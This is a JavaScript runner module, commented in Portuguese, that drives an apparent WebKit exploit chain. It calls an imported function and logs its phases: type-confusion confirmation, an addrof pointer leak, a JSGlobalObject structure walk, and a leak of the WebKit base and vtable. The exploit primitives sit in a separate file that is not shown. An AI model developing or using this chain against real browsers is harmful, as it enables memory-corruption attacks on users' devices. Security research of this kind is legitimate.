// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43m)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43m() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43m"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43m: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}_R43m: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43m: Teste completado.`, "good", FNAME_RUNNER);
        
        const { tc_confirmed, pointer_leak, structure_walk, webkit_leak } = result;

        logS3(`  RUNNER R43m: Confusão de Tipos (TC): ${tc_confirmed ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, tc_confirmed ? "vuln" : "warn", FNAME_RUNNER);
        
        if (pointer_leak) {
            logS3(`  RUNNER R43m: Fase 1 - Vazamento de Ponteiro: ${pointer_leak.msg} (Ponteiro: ${pointer_leak.leaked_ptr || 'N/A'})`, pointer_leak.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        
        if (structure_walk) {
            logS3(`  RUNNER R43m: Fase 2 - Navegação de Estruturas: ${structure_walk.msg} (JSGlobalObject: ${structure_walk.global_object_addr || 'N/A'})`, structure_walk.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak) {
            logS3(`  RUNNER R43m: Fase 3 - Vazamento da Base do WebKit: ${webkit_leak.msg} (Base Candidata: ${webkit_leak.webkit_base || 'N/A'}, vtable: ${webkit_leak.vtable_ptr || 'N/A'})`, webkit_leak.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak?.success) {
            document.title = `${module_name_for_title}_R43m: WebKitLeak SUCCESS!`;
        } else if (structure_walk?.success) {
            document.title = `${module_name_for_title}_R43m: GlobalObject OK`;
        } else if (pointer_leak?.success) {
            document.title = `${module_name_for_title}_R43m: PointerLeak OK`;
        } else if (tc_confirmed) {
            document.title = `${module_name_for_title}_R43m: TC OK, Leaks Fail`;
        } else {
            document.title = `${module_name_for_title}_R43m: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43m: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R43m (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43m();
    logS3(`\n==== Script 3 R43m (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43m Done`;
    }
}